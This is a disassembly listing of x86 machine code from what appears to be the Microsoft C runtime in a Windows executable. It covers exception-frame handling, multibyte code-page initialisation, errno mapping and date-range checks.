  403cbb:	90                   	nop
  403cbc:	90                   	nop
  403cbd:	90                   	nop
  403cbe:	90                   	nop
  403cbf:	90                   	nop
  403cc0:	55                   	push   %ebp
  403cc1:	8b ec                	mov    %esp,%ebp
  403cc3:	6a ff                	push   $0xffffffff
  403cc5:	68 d8 4e 42 00       	push   $0x424ed8
  403cca:	68 a8 60 40 00       	push   $0x4060a8
  403ccf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403cd5:	50                   	push   %eax
  403cd6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403cdd:	83 ec 08             	sub    $0x8,%esp
  403ce0:	53                   	push   %ebx
  403ce1:	56                   	push   %esi
  403ce2:	57                   	push   %edi
  403ce3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403ce6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403ced:	ff 4d 10             	decl   0x10(%ebp)
  403cf0:	78 1e                	js     0x403d10
  403cf2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403cf5:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  403cf8:	89 4d 08             	mov    %ecx,0x8(%ebp)
  403cfb:	ff 55 14             	call   *0x14(%ebp)
  403cfe:	eb ed                	jmp    0x403ced
  403d00:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403d03:	50                   	push   %eax
  403d04:	e8 27 00 00 00       	call   0x403d30
  403d09:	83 c4 04             	add    $0x4,%esp
  403d0c:	c3                   	ret
  403d0d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403d10:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403d17:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403d1a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403d21:	5f                   	pop    %edi
  403d22:	5e                   	pop    %esi
  403d23:	5b                   	pop    %ebx
  403d24:	8b e5                	mov    %ebp,%esp
  403d26:	5d                   	pop    %ebp
  403d27:	c2 10 00             	ret    $0x10
  403d2a:	90                   	nop
  403d2b:	90                   	nop
  403d2c:	90                   	nop
  403d2d:	90                   	nop
  403d2e:	90                   	nop
  403d2f:	90                   	nop
  403d30:	8b 44 24 04          	mov    0x4(%esp),%eax
  403d34:	8b 08                	mov    (%eax),%ecx
  403d36:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  403d3c:	75 05                	jne    0x403d43
  403d3e:	e8 8d 16 00 00       	call   0x4053d0
  403d43:	33 c0                	xor    %eax,%eax
  403d45:	c3                   	ret
  403d46:	90                   	nop
  403d47:	90                   	nop
  403d48:	90                   	nop
  403d49:	90                   	nop
  403d4a:	90                   	nop
  403d4b:	90                   	nop
  403d4c:	90                   	nop
  403d4d:	90                   	nop
  403d4e:	90                   	nop
  403d4f:	90                   	nop
  403d50:	83 ec 14             	sub    $0x14,%esp
  403d53:	53                   	push   %ebx
  403d54:	55                   	push   %ebp
  403d55:	56                   	push   %esi
  403d56:	57                   	push   %edi
  403d57:	6a 19                	push   $0x19
  403d59:	e8 72 26 00 00       	call   0x4063d0
  403d5e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403d62:	83 c4 04             	add    $0x4,%esp
  403d65:	50                   	push   %eax
  403d66:	e8 05 02 00 00       	call   0x403f70
  403d6b:	8b e8                	mov    %eax,%ebp
  403d6d:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  403d72:	83 c4 04             	add    $0x4,%esp
  403d75:	3b e8                	cmp    %eax,%ebp
  403d77:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  403d7b:	75 14                	jne    0x403d91
  403d7d:	6a 19                	push   $0x19
  403d7f:	e8 cc 26 00 00       	call   0x406450
  403d84:	83 c4 04             	add    $0x4,%esp
  403d87:	33 c0                	xor    %eax,%eax
  403d89:	5f                   	pop    %edi
  403d8a:	5e                   	pop    %esi
  403d8b:	5d                   	pop    %ebp
  403d8c:	5b                   	pop    %ebx
  403d8d:	83 c4 14             	add    $0x14,%esp
  403d90:	c3                   	ret
  403d91:	33 f6                	xor    %esi,%esi
  403d93:	3b ee                	cmp    %esi,%ebp
  403d95:	0f 84 f2 00 00 00    	je     0x403e8d
  403d9b:	33 d2                	xor    %edx,%edx
  403d9d:	b8 d8 98 42 00       	mov    $0x4298d8,%eax
  403da2:	39 28                	cmp    %ebp,(%eax)
  403da4:	0f 84 11 01 00 00    	je     0x403ebb
  403daa:	83 c0 30             	add    $0x30,%eax
  403dad:	42                   	inc    %edx
  403dae:	3d c8 99 42 00       	cmp    $0x4299c8,%eax
  403db3:	72 ed                	jb     0x403da2
  403db5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403db9:	51                   	push   %ecx
  403dba:	55                   	push   %ebp
  403dbb:	ff 15 f4 16 43 00    	call   *0x4316f4
  403dc1:	83 f8 01             	cmp    $0x1,%eax
  403dc4:	0f 85 bb 00 00 00    	jne    0x403e85
  403dca:	b9 40 00 00 00       	mov    $0x40,%ecx
  403dcf:	33 c0                	xor    %eax,%eax
  403dd1:	bf 00 ee 42 00       	mov    $0x42ee00,%edi
  403dd6:	f3 ab                	rep stos %eax,%es:(%edi)
  403dd8:	aa                   	stos   %al,%es:(%edi)
  403dd9:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  403dde:	76 71                	jbe    0x403e51
  403de0:	8a 44 24 16          	mov    0x16(%esp),%al
  403de4:	84 c0                	test   %al,%al
  403de6:	74 37                	je     0x403e1f
  403de8:	8d 54 24 17          	lea    0x17(%esp),%edx
  403dec:	8a 0a                	mov    (%edx),%cl
  403dee:	84 c9                	test   %cl,%cl
  403df0:	74 2d                	je     0x403e1f
  403df2:	33 c0                	xor    %eax,%eax
  403df4:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403dfa:	8a 42 ff             	mov    -0x1(%edx),%al
  403dfd:	3b c1                	cmp    %ecx,%eax
  403dff:	77 14                	ja     0x403e15
  403e01:	8a 98 01 ee 42 00    	mov    0x42ee01(%eax),%bl
  403e07:	80 cb 04             	or     $0x4,%bl
  403e0a:	88 98 01 ee 42 00    	mov    %bl,0x42ee01(%eax)
  403e10:	40                   	inc    %eax
  403e11:	3b c1                	cmp    %ecx,%eax
  403e13:	76 ec                	jbe    0x403e01
  403e15:	8a 42 01             	mov    0x1(%edx),%al
  403e18:	83 c2 02             	add    $0x2,%edx
  403e1b:	84 c0                	test   %al,%al
  403e1d:	75 cd                	jne    0x403dec
  403e1f:	b8 01 00 00 00       	mov    $0x1,%eax
  403e24:	8a 98 01 ee 42 00    	mov    0x42ee01(%eax),%bl
  403e2a:	80 cb 08             	or     $0x8,%bl
  403e2d:	88 98 01 ee 42 00    	mov    %bl,0x42ee01(%eax)
  403e33:	40                   	inc    %eax
  403e34:	3d ff 00 00 00       	cmp    $0xff,%eax
  403e39:	72 e9                	jb     0x403e24
  403e3b:	55                   	push   %ebp
  403e3c:	89 2d 04 ef 42 00    	mov    %ebp,0x42ef04
  403e42:	e8 79 01 00 00       	call   0x403fc0
  403e47:	83 c4 04             	add    $0x4,%esp
  403e4a:	a3 08 ef 42 00       	mov    %eax,0x42ef08
  403e4f:	eb 0c                	jmp    0x403e5d
  403e51:	89 35 04 ef 42 00    	mov    %esi,0x42ef04
  403e57:	89 35 08 ef 42 00    	mov    %esi,0x42ef08
  403e5d:	33 d2                	xor    %edx,%edx
  403e5f:	6a 19                	push   $0x19
  403e61:	89 15 10 ef 42 00    	mov    %edx,0x42ef10
  403e67:	89 15 14 ef 42 00    	mov    %edx,0x42ef14
  403e6d:	89 15 18 ef 42 00    	mov    %edx,0x42ef18
  403e73:	e8 d8 25 00 00       	call   0x406450
  403e78:	83 c4 04             	add    $0x4,%esp
  403e7b:	33 c0                	xor    %eax,%eax
  403e7d:	5f                   	pop    %edi
  403e7e:	5e                   	pop    %esi
  403e7f:	5d                   	pop    %ebp
  403e80:	5b                   	pop    %ebx
  403e81:	83 c4 14             	add    $0x14,%esp
  403e84:	c3                   	ret
  403e85:	39 35 1c ef 42 00    	cmp    %esi,0x42ef1c
  403e8b:	74 19                	je     0x403ea6
  403e8d:	e8 8e 01 00 00       	call   0x404020
  403e92:	6a 19                	push   $0x19
  403e94:	e8 b7 25 00 00       	call   0x406450
  403e99:	83 c4 04             	add    $0x4,%esp
  403e9c:	33 c0                	xor    %eax,%eax
  403e9e:	5f                   	pop    %edi
  403e9f:	5e                   	pop    %esi
  403ea0:	5d                   	pop    %ebp
  403ea1:	5b                   	pop    %ebx
  403ea2:	83 c4 14             	add    $0x14,%esp
  403ea5:	c3                   	ret
  403ea6:	6a 19                	push   $0x19
  403ea8:	e8 a3 25 00 00       	call   0x406450
  403ead:	83 c4 04             	add    $0x4,%esp
  403eb0:	83 c8 ff             	or     $0xffffffff,%eax
  403eb3:	5f                   	pop    %edi
  403eb4:	5e                   	pop    %esi
  403eb5:	5d                   	pop    %ebp
  403eb6:	5b                   	pop    %ebx
  403eb7:	83 c4 14             	add    $0x14,%esp
  403eba:	c3                   	ret
  403ebb:	b9 40 00 00 00       	mov    $0x40,%ecx
  403ec0:	33 c0                	xor    %eax,%eax
  403ec2:	bf 00 ee 42 00       	mov    $0x42ee00,%edi
  403ec7:	8d 1c 52             	lea    (%edx,%edx,2),%ebx
  403eca:	f3 ab                	rep stos %eax,%es:(%edi)
  403ecc:	aa                   	stos   %al,%es:(%edi)
  403ecd:	33 ff                	xor    %edi,%edi
  403ecf:	c1 e3 04             	shl    $0x4,%ebx
  403ed2:	8d ab e8 98 42 00    	lea    0x4298e8(%ebx),%ebp
  403ed8:	8a 45 00             	mov    0x0(%ebp),%al
  403edb:	8b f5                	mov    %ebp,%esi
  403edd:	84 c0                	test   %al,%al
  403edf:	74 30                	je     0x403f11
  403ee1:	8a 4e 01             	mov    0x1(%esi),%cl
  403ee4:	84 c9                	test   %cl,%cl
  403ee6:	74 29                	je     0x403f11
  403ee8:	33 c0                	xor    %eax,%eax
  403eea:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403ef0:	8a 06                	mov    (%esi),%al
  403ef2:	3b c1                	cmp    %ecx,%eax
  403ef4:	77 11                	ja     0x403f07
  403ef6:	8a 97 d0 98 42 00    	mov    0x4298d0(%edi),%dl
  403efc:	08 90 01 ee 42 00    	or     %dl,0x42ee01(%eax)
  403f02:	40                   	inc    %eax
  403f03:	3b c1                	cmp    %ecx,%eax
  403f05:	76 f5                	jbe    0x403efc
  403f07:	8a 46 02             	mov    0x2(%esi),%al
  403f0a:	83 c6 02             	add    $0x2,%esi
  403f0d:	84 c0                	test   %al,%al
  403f0f:	75 d0                	jne    0x403ee1
  403f11:	47                   	inc    %edi
  403f12:	83 c5 08             	add    $0x8,%ebp
  403f15:	83 ff 04             	cmp    $0x4,%edi
  403f18:	72 be                	jb     0x403ed8
  403f1a:	8b 44 24 28          	mov    0x28(%esp),%eax
  403f1e:	50                   	push   %eax
  403f1f:	a3 04 ef 42 00       	mov    %eax,0x42ef04
  403f24:	e8 97 00 00 00       	call   0x403fc0
  403f29:	8b 8b dc 98 42 00    	mov    0x4298dc(%ebx),%ecx
  403f2f:	8b 93 e0 98 42 00    	mov    0x4298e0(%ebx),%edx
  403f35:	a3 08 ef 42 00       	mov    %eax,0x42ef08
  403f3a:	8d 83 dc 98 42 00    	lea    0x4298dc(%ebx),%eax
  403f40:	83 c4 04             	add    $0x4,%esp
  403f43:	89 0d 10 ef 42 00    	mov    %ecx,0x42ef10
  403f49:	8b 40 08             	mov    0x8(%eax),%eax
  403f4c:	89 15 14 ef 42 00    	mov    %edx,0x42ef14
  403f52:	6a 19                	push   $0x19
  403f54:	a3 18 ef 42 00       	mov    %eax,0x42ef18
  403f59:	e8 f2 24 00 00       	call   0x406450
  403f5e:	83 c4 04             	add    $0x4,%esp
  403f61:	33 c0                	xor    %eax,%eax
  403f63:	5f                   	pop    %edi
  403f64:	5e                   	pop    %esi
  403f65:	5d                   	pop    %ebp
  403f66:	5b                   	pop    %ebx
  403f67:	83 c4 14             	add    $0x14,%esp
  403f6a:	c3                   	ret
  403f6b:	90                   	nop
  403f6c:	90                   	nop
  403f6d:	90                   	nop
  403f6e:	90                   	nop
  403f6f:	90                   	nop
  403f70:	8b 44 24 04          	mov    0x4(%esp),%eax
  403f74:	c7 05 1c ef 42 00 00 	movl   $0x0,0x42ef1c
  403f7b:	00 00 00 
  403f7e:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403f81:	75 10                	jne    0x403f93
  403f83:	c7 05 1c ef 42 00 01 	movl   $0x1,0x42ef1c
  403f8a:	00 00 00 
  403f8d:	ff 25 cc 16 43 00    	jmp    *0x4316cc
  403f93:	83 f8 fd             	cmp    $0xfffffffd,%eax
  403f96:	75 10                	jne    0x403fa8
  403f98:	c7 05 1c ef 42 00 01 	movl   $0x1,0x42ef1c
  403f9f:	00 00 00 
  403fa2:	ff 25 f8 16 43 00    	jmp    *0x4316f8
  403fa8:	83 f8 fc             	cmp    $0xfffffffc,%eax
  403fab:	75 0f                	jne    0x403fbc
  403fad:	a1 08 f1 42 00       	mov    0x42f108,%eax
  403fb2:	c7 05 1c ef 42 00 01 	movl   $0x1,0x42ef1c
  403fb9:	00 00 00 
  403fbc:	c3                   	ret
  403fbd:	90                   	nop
  403fbe:	90                   	nop
  403fbf:	90                   	nop
  403fc0:	8b 44 24 04          	mov    0x4(%esp),%eax
  403fc4:	05 5c fc ff ff       	add    $0xfffffc5c,%eax
  403fc9:	83 f8 12             	cmp    $0x12,%eax
  403fcc:	77 27                	ja     0x403ff5
  403fce:	33 c9                	xor    %ecx,%ecx
  403fd0:	8a 88 0c 40 40 00    	mov    0x40400c(%eax),%cl
  403fd6:	ff 24 8d f8 3f 40 00 	jmp    *0x403ff8(,%ecx,4)
  403fdd:	b8 11 04 00 00       	mov    $0x411,%eax
  403fe2:	c3                   	ret
  403fe3:	b8 04 08 00 00       	mov    $0x804,%eax
  403fe8:	c3                   	ret
  403fe9:	b8 12 04 00 00       	mov    $0x412,%eax
  403fee:	c3                   	ret
  403fef:	b8 04 04 00 00       	mov    $0x404,%eax
  403ff4:	c3                   	ret
  403ff5:	33 c0                	xor    %eax,%eax
  403ff7:	c3                   	ret
  403ff8:	dd 3f                	fnstsw (%edi)
  403ffa:	40                   	inc    %eax
  403ffb:	00 e3                	add    %ah,%bl
  403ffd:	3f                   	aas
  403ffe:	40                   	inc    %eax
  403fff:	00 e9                	add    %ch,%cl
  404001:	3f                   	aas
  404002:	40                   	inc    %eax
  404003:	00 ef                	add    %ch,%bh
  404005:	3f                   	aas
  404006:	40                   	inc    %eax
  404007:	00 f5                	add    %dh,%ch
  404009:	3f                   	aas
  40400a:	40                   	inc    %eax
  40400b:	00 00                	add    %al,(%eax)
  40400d:	04 04                	add    $0x4,%al
  40400f:	04 01                	add    $0x1,%al
  404011:	04 04                	add    $0x4,%al
  404013:	04 04                	add    $0x4,%al
  404015:	04 04                	add    $0x4,%al
  404017:	04 04                	add    $0x4,%al
  404019:	04 04                	add    $0x4,%al
  40401b:	04 04                	add    $0x4,%al
  40401d:	02 03                	add    (%ebx),%al
  40401f:	90                   	nop
  404020:	57                   	push   %edi
  404021:	b9 40 00 00 00       	mov    $0x40,%ecx
  404026:	33 c0                	xor    %eax,%eax
  404028:	bf 00 ee 42 00       	mov    $0x42ee00,%edi
  40402d:	f3 ab                	rep stos %eax,%es:(%edi)
  40402f:	aa                   	stos   %al,%es:(%edi)
  404030:	33 c0                	xor    %eax,%eax
  404032:	5f                   	pop    %edi
  404033:	a3 04 ef 42 00       	mov    %eax,0x42ef04
  404038:	a3 08 ef 42 00       	mov    %eax,0x42ef08
  40403d:	a3 10 ef 42 00       	mov    %eax,0x42ef10
  404042:	a3 14 ef 42 00       	mov    %eax,0x42ef14
  404047:	a3 18 ef 42 00       	mov    %eax,0x42ef18
  40404c:	c3                   	ret
  40404d:	90                   	nop
  40404e:	90                   	nop
  40404f:	90                   	nop
  404050:	6a fd                	push   $0xfffffffd
  404052:	e8 f9 fc ff ff       	call   0x403d50
  404057:	83 c4 04             	add    $0x4,%esp
  40405a:	c3                   	ret
  40405b:	90                   	nop
  40405c:	90                   	nop
  40405d:	90                   	nop
  40405e:	90                   	nop
  40405f:	90                   	nop
  404060:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  404065:	56                   	push   %esi
  404066:	33 f6                	xor    %esi,%esi
  404068:	85 c0                	test   %eax,%eax
  40406a:	75 14                	jne    0x404080
  40406c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404070:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404074:	50                   	push   %eax
  404075:	51                   	push   %ecx
  404076:	e8 25 34 00 00       	call   0x4074a0
  40407b:	83 c4 08             	add    $0x8,%esp
  40407e:	5e                   	pop    %esi
  40407f:	c3                   	ret
  404080:	57                   	push   %edi
  404081:	55                   	push   %ebp
  404082:	53                   	push   %ebx
  404083:	6a 19                	push   $0x19
  404085:	e8 46 23 00 00       	call   0x4063d0
  40408a:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40408e:	8b 54 24 18          	mov    0x18(%esp),%edx
  404092:	83 c4 04             	add    $0x4,%esp
  404095:	b3 04                	mov    $0x4,%bl
  404097:	8a 0a                	mov    (%edx),%cl
  404099:	8b c1                	mov    %ecx,%eax
  40409b:	25 ff 00 00 00       	and    $0xff,%eax
  4040a0:	8b e8                	mov    %eax,%ebp
  4040a2:	81 e5 ff 00 00 00    	and    $0xff,%ebp
  4040a8:	84 9d 01 ee 42 00    	test   %bl,0x42ee01(%ebp)
  4040ae:	74 24                	je     0x4040d4
  4040b0:	8a 4a 01             	mov    0x1(%edx),%cl
  4040b3:	42                   	inc    %edx
  4040b4:	84 c9                	test   %cl,%cl
  4040b6:	74 16                	je     0x4040ce
  4040b8:	8b e9                	mov    %ecx,%ebp
  4040ba:	c1 e0 08             	shl    $0x8,%eax
  4040bd:	81 e5 ff 00 00 00    	and    $0xff,%ebp
  4040c3:	0b c5                	or     %ebp,%eax
  4040c5:	3b f8                	cmp    %eax,%edi
  4040c7:	75 11                	jne    0x4040da
  4040c9:	8d 72 ff             	lea    -0x1(%edx),%esi
  4040cc:	eb 0c                	jmp    0x4040da
  4040ce:	85 f6                	test   %esi,%esi
  4040d0:	75 08                	jne    0x4040da
  4040d2:	eb 04                	jmp    0x4040d8
  4040d4:	3b f8                	cmp    %eax,%edi
  4040d6:	75 02                	jne    0x4040da
  4040d8:	8b f2                	mov    %edx,%esi
  4040da:	42                   	inc    %edx
  4040db:	84 c9                	test   %cl,%cl
  4040dd:	75 b8                	jne    0x404097
  4040df:	6a 19                	push   $0x19
  4040e1:	e8 6a 23 00 00       	call   0x406450
  4040e6:	83 c4 04             	add    $0x4,%esp
  4040e9:	8b c6                	mov    %esi,%eax
  4040eb:	5b                   	pop    %ebx
  4040ec:	5d                   	pop    %ebp
  4040ed:	5f                   	pop    %edi
  4040ee:	5e                   	pop    %esi
  4040ef:	c3                   	ret
  4040f0:	56                   	push   %esi
  4040f1:	e8 8a 00 00 00       	call   0x404180
  4040f6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4040fa:	33 f6                	xor    %esi,%esi
  4040fc:	89 08                	mov    %ecx,(%eax)
  4040fe:	b8 c8 99 42 00       	mov    $0x4299c8,%eax
  404103:	3b 08                	cmp    (%eax),%ecx
  404105:	74 4c                	je     0x404153
  404107:	83 c0 08             	add    $0x8,%eax
  40410a:	46                   	inc    %esi
  40410b:	3d 30 9b 42 00       	cmp    $0x429b30,%eax
  404110:	72 f1                	jb     0x404103
  404112:	83 f9 13             	cmp    $0x13,%ecx
  404115:	72 12                	jb     0x404129
  404117:	83 f9 24             	cmp    $0x24,%ecx
  40411a:	77 0d                	ja     0x404129
  40411c:	e8 4f 00 00 00       	call   0x404170
  404121:	c7 00 0d 00 00 00    	movl   $0xd,(%eax)
  404127:	5e                   	pop    %esi
  404128:	c3                   	ret
  404129:	81 f9 bc 00 00 00    	cmp    $0xbc,%ecx
  40412f:	72 15                	jb     0x404146
  404131:	81 f9 ca 00 00 00    	cmp    $0xca,%ecx
  404137:	77 0d                	ja     0x404146
  404139:	e8 32 00 00 00       	call   0x404170
  40413e:	c7 00 08 00 00 00    	movl   $0x8,(%eax)
  404144:	5e                   	pop    %esi
  404145:	c3                   	ret
  404146:	e8 25 00 00 00       	call   0x404170
  40414b:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404151:	5e                   	pop    %esi
  404152:	c3                   	ret
  404153:	e8 18 00 00 00       	call   0x404170
  404158:	8b 0c f5 cc 99 42 00 	mov    0x4299cc(,%esi,8),%ecx
  40415f:	5e                   	pop    %esi
  404160:	89 08                	mov    %ecx,(%eax)
  404162:	c3                   	ret
  404163:	90                   	nop
  404164:	90                   	nop
  404165:	90                   	nop
  404166:	90                   	nop
  404167:	90                   	nop
  404168:	90                   	nop
  404169:	90                   	nop
  40416a:	90                   	nop
  40416b:	90                   	nop
  40416c:	90                   	nop
  40416d:	90                   	nop
  40416e:	90                   	nop
  40416f:	90                   	nop
  404170:	e8 db 11 00 00       	call   0x405350
  404175:	83 c0 08             	add    $0x8,%eax
  404178:	c3                   	ret
  404179:	90                   	nop
  40417a:	90                   	nop
  40417b:	90                   	nop
  40417c:	90                   	nop
  40417d:	90                   	nop
  40417e:	90                   	nop
  40417f:	90                   	nop
  404180:	e8 cb 11 00 00       	call   0x405350
  404185:	83 c0 0c             	add    $0xc,%eax
  404188:	c3                   	ret
  404189:	90                   	nop
  40418a:	90                   	nop
  40418b:	90                   	nop
  40418c:	90                   	nop
  40418d:	90                   	nop
  40418e:	90                   	nop
  40418f:	90                   	nop
  404190:	83 ec 20             	sub    $0x20,%esp
  404193:	8b 44 24 24          	mov    0x24(%esp),%eax
  404197:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40419b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40419f:	89 44 24 00          	mov    %eax,0x0(%esp)
  4041a3:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4041a7:	56                   	push   %esi
  4041a8:	50                   	push   %eax
  4041a9:	8d 54 24 08          	lea    0x8(%esp),%edx
  4041ad:	51                   	push   %ecx
  4041ae:	52                   	push   %edx
  4041af:	c7 44 24 1c 42 00 00 	movl   $0x42,0x1c(%esp)
  4041b6:	00 
  4041b7:	c7 44 24 14 ff ff ff 	movl   $0x7fffffff,0x14(%esp)
  4041be:	7f 
  4041bf:	e8 3c 35 00 00       	call   0x407700
  4041c4:	8b f0                	mov    %eax,%esi
  4041c6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4041ca:	83 c4 0c             	add    $0xc,%esp
  4041cd:	48                   	dec    %eax
  4041ce:	89 44 24 08          	mov    %eax,0x8(%esp)
  4041d2:	78 0e                	js     0x4041e2
  4041d4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4041d8:	c6 00 00             	movb   $0x0,(%eax)
  4041db:	8b c6                	mov    %esi,%eax
  4041dd:	5e                   	pop    %esi
  4041de:	83 c4 20             	add    $0x20,%esp
  4041e1:	c3                   	ret
  4041e2:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4041e6:	51                   	push   %ecx
  4041e7:	6a 00                	push   $0x0
  4041e9:	e8 e2 33 00 00       	call   0x4075d0
  4041ee:	83 c4 08             	add    $0x8,%esp
  4041f1:	8b c6                	mov    %esi,%eax
  4041f3:	5e                   	pop    %esi
  4041f4:	83 c4 20             	add    $0x20,%esp
  4041f7:	c3                   	ret
  4041f8:	90                   	nop
  4041f9:	90                   	nop
  4041fa:	90                   	nop
  4041fb:	90                   	nop
  4041fc:	90                   	nop
  4041fd:	90                   	nop
  4041fe:	90                   	nop
  4041ff:	90                   	nop
  404200:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404204:	33 c0                	xor    %eax,%eax
  404206:	8a 01                	mov    (%ecx),%al
  404208:	8a 80 01 ee 42 00    	mov    0x42ee01(%eax),%al
  40420e:	24 04                	and    $0x4,%al
  404210:	f6 d8                	neg    %al
  404212:	1b c0                	sbb    %eax,%eax
  404214:	f7 d8                	neg    %eax
  404216:	40                   	inc    %eax
  404217:	c3                   	ret
  404218:	90                   	nop
  404219:	90                   	nop
  40421a:	90                   	nop
  40421b:	90                   	nop
  40421c:	90                   	nop
  40421d:	90                   	nop
  40421e:	90                   	nop
  40421f:	90                   	nop
  404220:	51                   	push   %ecx
  404221:	8b 44 24 08          	mov    0x8(%esp),%eax
  404225:	3d ff 00 00 00       	cmp    $0xff,%eax
  40422a:	76 64                	jbe    0x404290
  40422c:	8b c8                	mov    %eax,%ecx
  40422e:	88 44 24 09          	mov    %al,0x9(%esp)
  404232:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  404237:	66 c7 44 24 00 00 00 	movw   $0x0,0x0(%esp)
  40423e:	c1 e9 08             	shr    $0x8,%ecx
  404241:	85 c0                	test   %eax,%eax
  404243:	66 c7 44 24 02 00 00 	movw   $0x0,0x2(%esp)
  40424a:	88 4c 24 08          	mov    %cl,0x8(%esp)
  40424e:	75 02                	jne    0x404252
  404250:	59                   	pop    %ecx
  404251:	c3                   	ret
  404252:	8b 15 08 ef 42 00    	mov    0x42ef08,%edx
  404258:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40425c:	52                   	push   %edx
  40425d:	50                   	push   %eax
  40425e:	8d 44 24 08          	lea    0x8(%esp),%eax
  404262:	50                   	push   %eax
  404263:	6a 02                	push   $0x2
  404265:	51                   	push   %ecx
  404266:	6a 01                	push   $0x1
  404268:	e8 e3 40 00 00       	call   0x408350
  40426d:	83 c4 18             	add    $0x18,%esp
  404270:	85 c0                	test   %eax,%eax
  404272:	75 02                	jne    0x404276
  404274:	59                   	pop    %ecx
  404275:	c3                   	ret
  404276:	66 83 7c 24 02 00    	cmpw   $0x0,0x2(%esp)
  40427c:	75 0e                	jne    0x40428c
  40427e:	f6 44 24 00 04       	testb  $0x4,0x0(%esp)
  404283:	74 07                	je     0x40428c
  404285:	b8 01 00 00 00       	mov    $0x1,%eax
  40428a:	59                   	pop    %ecx
  40428b:	c3                   	ret
  40428c:	33 c0                	xor    %eax,%eax
  40428e:	59                   	pop    %ecx
  40428f:	c3                   	ret
  404290:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  404297:	7e 0d                	jle    0x4042a6
  404299:	6a 04                	push   $0x4
  40429b:	50                   	push   %eax
  40429c:	e8 8f 2f 00 00       	call   0x407230
  4042a1:	83 c4 08             	add    $0x8,%esp
  4042a4:	59                   	pop    %ecx
  4042a5:	c3                   	ret
  4042a6:	8b 15 30 be 42 00    	mov    0x42be30,%edx
  4042ac:	8a 04 42             	mov    (%edx,%eax,2),%al
  4042af:	83 e0 04             	and    $0x4,%eax
  4042b2:	59                   	pop    %ecx
  4042b3:	c3                   	ret
  4042b4:	90                   	nop
  4042b5:	90                   	nop
  4042b6:	90                   	nop
  4042b7:	90                   	nop
  4042b8:	90                   	nop
  4042b9:	90                   	nop
  4042ba:	90                   	nop
  4042bb:	90                   	nop
  4042bc:	90                   	nop
  4042bd:	90                   	nop
  4042be:	90                   	nop
  4042bf:	90                   	nop
  4042c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4042c4:	6a 01                	push   $0x1
  4042c6:	50                   	push   %eax
  4042c7:	e8 04 00 00 00       	call   0x4042d0
  4042cc:	83 c4 08             	add    $0x8,%esp
  4042cf:	c3                   	ret
  4042d0:	53                   	push   %ebx
  4042d1:	56                   	push   %esi
  4042d2:	57                   	push   %edi
  4042d3:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4042d7:	8b 4f 14             	mov    0x14(%edi),%ecx
  4042da:	83 f9 45             	cmp    $0x45,%ecx
  4042dd:	0f 8c 22 02 00 00    	jl     0x404505
  4042e3:	81 f9 8b 00 00 00    	cmp    $0x8b,%ecx
  4042e9:	0f 8f 16 02 00 00    	jg     0x404505
  4042ef:	8b 77 10             	mov    0x10(%edi),%esi
  4042f2:	85 f6                	test   %esi,%esi
  4042f4:	7c 05                	jl     0x4042fb
  4042f6:	83 fe 0b             	cmp    $0xb,%esi
  4042f9:	7e 3e                	jle    0x404339
  4042fb:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  404300:	f7 ee                	imul   %esi
  404302:	d1 fa                	sar    $1,%edx
  404304:	8b c2                	mov    %edx,%eax
  404306:	c1 e8 1f             	shr    $0x1f,%eax
  404309:	03 d0                	add    %eax,%edx
  40430b:	8b c6                	mov    %esi,%eax
  40430d:	03 ca                	add    %edx,%ecx
  40430f:	be 0c 00 00 00       	mov    $0xc,%esi
  404314:	99                   	cltd
  404315:	f7 fe                	idiv   %esi
  404317:	85 d2                	test   %edx,%edx
  404319:	89 57 10             	mov    %edx,0x10(%edi)
  40431c:	7d 06                	jge    0x404324
  40431e:	03 d6                	add    %esi,%edx
  404320:	49                   	dec    %ecx
  404321:	89 57 10             	mov    %edx,0x10(%edi)
  404324:	83 f9 45             	cmp    $0x45,%ecx
  404327:	0f 8c d8 01 00 00    	jl     0x404505
  40432d:	81 f9 8b 00 00 00    	cmp    $0x8b,%ecx
  404333:	0f 8f cc 01 00 00    	jg     0x404505
  404339:	8b 57 10             	mov    0x10(%edi),%edx
  40433c:	f6 c1 03             	test   $0x3,%cl
  40433f:	8b 04 95 48 c1 42 00 	mov    0x42c148(,%edx,4),%eax
  404346:	75 06                	jne    0x40434e
  404348:	83 fa 01             	cmp    $0x1,%edx
  40434b:	7e 01                	jle    0x40434e
  40434d:	40                   	inc    %eax
  40434e:	8d 34 c9             	lea    (%ecx,%ecx,8),%esi
  404351:	8d 51 ff             	lea    -0x1(%ecx),%edx
